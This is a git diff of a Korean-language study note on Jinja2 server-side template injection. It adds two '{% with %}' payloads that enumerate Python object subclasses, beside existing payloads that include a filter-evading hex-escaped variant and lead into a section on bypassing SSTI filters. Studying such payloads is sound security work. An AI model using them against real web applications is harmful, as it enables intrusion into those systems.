@@ -155,7 +155,7 @@ mro 또한 객체가 상속받은 클래스 목록을 확인할 수 있으며,
 
 > 이 외에도 Jinja2 웹 템플릿 엔진에서 사용되는 Payload는 무척 많으며, 각 상황에 맞게 적절하게 만들어 사용하여야 한다.
 
-```python
+```
 # To access a class object
 [].__class__
 ''.__class__
@@ -178,12 +178,14 @@ dict.__mro__[-1]
 {{ dict.mro()[-1].__subclasses__() }}
 {{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
 
+{% with a = dict.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
 
 # Other examples using these ways
 {{ ().__class__.__base__.__subclasses__() }}
 {{ [].__class__.__mro__[-1].__subclasses__() }}
 {{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
 {{ request.__class__.mro()[-1].__subclasses__() }}
+{% with a = config.__class__.mro()[-1].__subclasses__() %} {{ a }} {% endwith %}
 ```
 
 # Bypass SSTI Filtering
